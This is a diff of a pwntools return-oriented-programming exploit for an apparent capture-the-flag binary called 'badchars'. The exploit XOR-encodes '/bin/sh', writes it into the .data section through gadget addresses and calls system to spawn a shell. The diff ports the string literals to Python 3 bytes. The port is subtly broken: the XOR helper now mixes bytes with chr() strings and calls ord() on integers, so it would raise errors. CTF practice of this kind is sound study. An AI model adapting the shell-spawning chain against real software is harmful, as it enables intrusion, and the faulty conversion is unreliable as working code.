@@ -1,7 +1,7 @@
 from pwn import *
 
 def xorstring(toxor,key):
-    retval = ""
+    retval = b""
     for letter in toxor:
         retval+= chr(ord(letter)^key)
     return retval
@@ -10,8 +10,8 @@ pr = process("./badchars")
 
 # In order to get past the bad characters xor the /bin/sh string
 key = 0xf6
-binsh = xorstring("/bin/sh",key)
-binsh += "\x00"
+binsh = xorstring(b"/bin/sh",key)
+binsh += b"\x00"
 
 # Where we will be wrinting our string to
 data = 0x601000
@@ -31,7 +31,7 @@ pop_rdi_ret = p64(0x400b39)
 system = p64(0x4009e8)
 
 # Gets us onto the stack proper
-payload = "A"*40
+payload = b"A"*40
 
 # Gets our /bin/sh into .data
 payload += pop_12_13_ret + binsh + p64(data) + mov_a13_12
